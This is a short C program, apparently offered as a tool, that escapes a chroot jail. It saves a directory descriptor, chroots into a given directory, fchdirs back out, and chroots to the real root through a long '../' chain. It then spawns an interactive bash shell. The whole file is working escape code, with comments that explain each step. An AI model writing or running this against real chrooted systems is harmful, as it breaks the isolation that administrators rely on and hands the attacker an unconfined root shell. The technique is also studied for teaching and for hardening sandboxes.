#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>


int main(int argc, char *argv[]){
	if(argc != 2){
		printf("You need to give as an argument a directory the tool will use to chroot\n");
		return EXIT_FAILURE;
	}
	
	/*
	* We open a directory befor chrooting to be able to exit our own chroot. 
	*/
	int fd=open(".",O_DIRECTORY);
	if(fd<0){
		perror("open");
		return EXIT_FAILURE;
	}
	
	/*
	* We chroot in an other directory. There is no need for this directory 
	* to have /bin/bash... because we will chroot another time to be sure
	* to be able to use system().
	*/
	if(chroot(argv[1])<0){
		perror("chroot");
		return EXIT_FAILURE;
	}	

	/*
	* Here we exit of our own chroot directory: this also enable to 
	* bypass the initial chroot because our process can only have one 
	* process root directory.
	*/
	if(fchdir(fd)<0){
		perror("fchdir");
		return EXIT_FAILURE;
	}
	
	
	/*
	 * We try to chroot directly to the real root directory to be sure 
	 * to be able to use system() even if the directory we chrooted 
	 * earlier does not contains $PATH.
	 * */
	if(chroot("../../../../../../../../../../../../../../../../..")<0){
		perror("chroot");
		return EXIT_FAILURE;
	}
	
	system("/bin/bash -i");
	return EXIT_SUCCESS;
}
